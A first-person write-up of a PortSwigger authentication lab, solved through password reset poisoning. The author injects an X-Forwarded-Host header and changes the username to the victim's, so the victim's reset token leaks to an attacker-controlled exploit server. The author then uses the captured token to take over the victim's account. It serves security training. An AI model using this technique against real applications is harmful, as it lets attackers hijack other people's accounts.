THIS IS A LAB WRITE-UP FOR ONE THE AUTHENTICATION TESTING LABS OF PORTSWIGGER
LAB:
PRACTITIONER
Authentication vulnerabilities 45 of 55


1. Getting My Email and Starting the Flow
Opened the lab and logged into my own account.
Retrieved the email assigned to my user (Wiener).

```text
wiener@exploit-0a35005803b5c8dd8021166601660059.exploit-server.net
```
Used the “Forgot password” feature and entered my email.
Intercepted the outgoing request in Burp.
Confirmed the username parameter contained my full email.

```http
username=wiener%40exploit-0a35005803b5c8dd8021166601660059.exploit-server.net
```

2. Analyzing the Reset Link
Checked my email inbox in the exploit server.
Opened the password reset link.
Saw that the URL included a reset token.

```text
https://0afa00cc04aff4a080090d070057003b.web-security-academy.net/forgot-password?temp-forgot-password-token=_token_
```

Realized that if I could redirect Carlos’s reset link to my server by changing the hostname, I could capture his token.

3. Testing X-Forwarded-Host
Sent the intercepted request to Repeater.
Added an X-Forwarded-Host header pointing to my exploit server.

```http
X-Forwarded-Host: exploit-0a35005803b5c8dd8021166601660059.exploit-server.net
```

Sent the request and got a 200 OK.
Verified that a new email arrived with the reset link now pointing to my exploit server.

```text
https://exploit-0a35005803b5c8dd8021166601660059.exploit-server.net/forgot-password?temp-forgot-password-token=_token_
```
Clicked the link and confirmed the exploit server logged a request containing my own token.

```text
84.54.75.249    2025-11-19 05:57:16 +0000 "GET /forgot-password?temp-forgot-password-token=_token_........

```
This confirmed the header is supported, and the attack should work on Carlos too.

4. Attempting Attack on Carlos (**Failed Flow**)
In Repeater, changed the username parameter from my email to carlos.
Sent the request multiple times.
The exploit server showed no logs from Carlos at all.

Followed PortSwigger’l **official solution** steps:

Use the same intercepted request.

Add X-Forwarded-Host.

Change the username to Carlos.

Send the request and check logs.

Still, the exploit server logged nothing.

**Clearly, the write‑up flow didn’t work as written.**

5. Discovering the Hidden Identifier
Examined the POST request more closely.
Noticed that the email PortSwigger assigned to my account contained a long unique identifier inside the hostname.

```text
username=wiener%40exploit-<0a35005803b5c8dd8021166601660059>.exploit-server.net

Suspected this identifier was being used to validate the request internally.

Realized this meant the server might be binding the reset flow to that specific identifier.

6. Testing Without the Identifier
Sent a new forgot-password request without the identifier portion.

```text
username=wiener
```

Surprisingly, it still returned 200 OK.
Checked my email inbox and confirmed a new password reset link arrived.
This proved the server would generate a reset link even without the identifier.

7. **Triggering Carlos’s Token Successfully**

Returned to Repeater.
Removed the identifier from the username value.
Changed the username to carlos.

```text
username=carlos
```
Repeated the request **multiple** times without the identifier.
Finally, the exploit server logged a GET request **multiple times** containing Carlos’s password reset token.

```text
10.0.3.200      2025-11-19 05:59:03 +0000 "GET /forgot-password?temp-forgot-password-token=_token1_
10.0.3.200      2025-11-19 05:59:04 +0000 "GET /forgot-password?temp-forgot-password-token=_token2_
10.0.3.200      2025-11-19 05:59:05 +0000 "GET /forgot-password?temp-forgot-password-token=_token3_
```
Copied the valid reset URL sent to my own account.
Replaced my token with Carlos’s captured _token_.
Loaded the modified URL and set a new password for Carlos.

8. Result
Logged in as Carlos with the new password.
Lab successfully solved.
